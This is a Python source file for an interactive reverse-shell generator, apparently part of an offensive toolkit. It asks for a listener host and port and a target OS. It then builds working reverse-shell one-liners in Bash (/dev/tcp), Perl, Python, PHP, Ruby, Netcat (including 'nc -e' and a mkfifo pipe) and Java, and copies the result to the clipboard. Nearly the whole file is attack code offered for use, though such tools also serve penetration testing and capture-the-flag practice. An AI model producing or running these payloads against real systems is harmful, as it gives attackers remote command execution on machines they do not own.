#!/usr/bin/python3

from assets.headers import rsgen_header
from assets.colors import *
from assets.prefixes import eagleshell_prefix, invalid_input_prefix, payload_prefix, system_prefix, lhost_prefix, lport_prefix
from assets.shortcuts import Exit
from .exploitation import Exploitation
import netifaces
import pyperclip


class RSGen:
    def __init__(self):
        self.output = ''
        self.output2 = ''
        self.configuration()
        self.system()
        self.payload()
        self.result()

    def configuration(self):
        try:
            rsgen_header()
            print('Configuration:')
            self.ips()
            print('\n\tLHOST Example: 192.168.1.123')
            print('\tLPORT Example: 8080')
            print('\n\tZ): Back')
            print('\tX): Exit\n')
            self.lhost_set = input(lhost_prefix).lower()
            if self.lhost_set == 'z':
                Exploitation()
            elif self.lhost_set == 'x':
                Exit()
            self.lport_set = input(lport_prefix).lower()
            if self.lport_set == 'z':
                Exploitation()
            elif self.lport_set == 'x':
                Exit()
        except KeyboardInterrupt:
            Exit()

    def ips(self):
        x = netifaces.interfaces()
        for i in x:
            if i != '':
                print('\n\tInterface: ' + i)
            try:
                ip = netifaces.ifaddresses(i)[netifaces.AF_INET][0]['addr']
                print('\tIP addr: {0} '.format(ip))
            except KeyError:
                continue

    def system(self):
        try:
            rsgen_header()
            print('System:')
            print('\n\t1): Linux')
            print('\t2): Windows')
            print('\n\tZ): Back')
            print('\tX): Exit\n')
            while True:
                system_select = input(system_prefix).lower()
                if system_select == '1':
                    self.system_set = '/bin/sh -i'
                    break
                elif system_select == '2':
                    self.system_set = 'cmd.exe'
                    break
                elif system_select == 'z':
                    Exploitation()
                elif system_select == 'x':
                    Exit()
                else:
                    print(invalid_input_prefix)
                    continue
        except KeyboardInterrupt:
            Exit()

    def payload(self):
        try:
            rsgen_header()
            print('Payload:')
            print('\n\t1): Bash')
            print('\t2): Perl')
            print('\t3): Python')
            print('\t4): PHP')
            print('\t5): Ruby')
            print('\t6): Netcat')
            print('\t7): Java')
            print('\n\tZ): Back')
            print('\tX): Exit\n')
            while True:
                shell_select = input(payload_prefix).lower()
                if shell_select == '1':
                    self.shell_set = 'Bash'
                    self.output = self.system_set + ' >& /dev/tcp/' + self.lhost_set + '/' + self.lport_set + ' 0>&1'
                    break
                elif shell_select == '2':
                    self.shell_set = 'Perl'
                    self.output = "perl -e 'use Socket;$i="'"' + self.lhost_set + '"'";$p=" + self.lport_set + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname("'"tcp"'"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"'">&S"'");open(STDOUT,"'">&S"'");open(STDERR,"'">&S"'");exec("'"' + self.system_set + '"'");};'"
                    break
                elif shell_select == '3':
                    self.shell_set = 'Python'
                    self.output = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'"' + self.lhost_set + '"'"," + self.lport_set + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["'"' + self.system_set + '"'"]);'"
                    break
                elif shell_select == '4':
                    self.shell_set = 'PHP'
                    self.output = "php -r '$sock=fsockopen("'"' + self.lhost_set + '"'',' + self.lport_set + ');exec("' + self.system_set + ' <&3 >&3 2>&3");'"'"
                    break
                elif shell_select == '5':
                    self.shell_set = 'Ruby'
                    self.output = "ruby -rsocket -e'f=TCPSocket.open("'"' + self.lhost_set + '"'',' + self.lport_set + ').to_i;exec sprintf("' + self.system_set + ' <&%d >&%d 2>&%d",f,f,f)'"'"
                    break
                elif shell_select == '6':
                    self.shell_set = 'Netcat'
                    self.output = 'nc -e ' + self.system_set + ' ' + self.lhost_set + ' ' + self.lport_set
                    self.output2 = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|' + self.system_set + ' 2>&1|nc ' + self.lhost_set + ' ' + self.lport_set + ' >/tmp/f'
                    break
                elif shell_select == '7':
                    self.shell_set = 'Java'
                    part1 = 'r = Runtime.getRuntime()'
                    part2 = '\np = r.exec(["' + self.system_set + '","-c","exec 5<>/dev/tcp/' + self.lhost_set + '/' + self.lport_set + ';cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])'
                    part3 = '\np.waitFor()'
                    self.output = part1 + part2 + part3
                    break
                elif shell_select == 'z':
                    Exploitation()
                elif shell_select == 'x':
                    Exit()
                else:
                    print(invalid_input_prefix)
                    continue
        except KeyboardInterrupt:
            Exit()

    def result(self):
        try:
            rsgen_header()
            print('Output:')
            print('\n\tPAYLOAD: ' + GREEN + self.shell_set + WHITE)
            print('\tLHOST: ' + GREEN + self.lhost_set + WHITE)
            print('\tLPORT: ' + GREEN + self.lport_set + WHITE)
            print('\n\tOUTPUT: ' + GREEN + self.output + WHITE)
            pyperclip.copy(self.output)
            if len(self.output2) > 1:
                print('\tOUTPUT 2: ' + GREEN + self.output2 + WHITE)
                print(GREEN + '\n\t[+] Output 1 Copied to Clipboard' + WHITE)
            else:
                print(GREEN + '\n\t[+] Output Copied to Clipboard' + WHITE)
            print('\n\tY): New')
            print('\tZ): Menu')
            print('\tX): Exit\n')
            while True:
                cmd = input(eagleshell_prefix).lower()
                if cmd == 'y':
                    RSGen()
                elif cmd == 'z':
                    Exploitation()
                elif cmd == 'x':
                    Exit()
                else:
                    print(invalid_input_prefix)
                    continue
        except KeyboardInterrupt:
            Exit()
